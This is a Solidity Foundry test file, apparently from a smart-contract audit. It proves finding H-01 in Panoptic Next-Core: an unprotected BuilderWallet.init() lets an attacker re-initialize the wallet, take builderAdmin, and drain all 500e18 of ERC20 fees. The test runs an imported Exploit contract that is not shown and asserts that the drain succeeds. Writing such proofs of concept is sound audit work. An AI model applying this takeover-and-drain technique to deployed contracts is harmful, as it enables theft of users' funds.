// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, BuilderWallet, MiniToken} from "./65025-h-01-builderwallet-init-is-unprotectedre-initializable-enabl.sol";

// Panoptic Next-Core H-01 (finding 65025): BuilderWallet.init() has no access
// control / only-once guard, so an attacker re-inits the wallet to overwrite
// builderAdmin, then passes sweep()'s auth check and drains all ERC20 fees.
contract Finding65025Test is Test {
    function test_exploit_unprotectedInit_drainsBuilderFees() public {
        Exploit e = new Exploit();

        // legit builder owns the wallet, which holds 500e18 fees, before the attack
        BuilderWallet wallet = e.wallet();
        MiniToken token = e.token();
        assertEq(wallet.builderAdmin(), address(0xBEEF), "legit admin set at deploy");
        assertEq(token.balanceOf(address(wallet)), 500 ether, "wallet funded with fees");

        e.run();

        emit log_named_uint("swept by attacker", e.swept());
        emit log_named_address("builderAdmin after attack", wallet.builderAdmin());

        assertEq(wallet.builderAdmin(), address(e), "attacker seized builderAdmin via reinit");
        assertEq(e.swept(), 500 ether, "attacker swept full 500e18 fee balance");
        assertEq(token.balanceOf(address(e)), 500 ether, "attacker holds the drained fees");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet fully drained");
    }
}
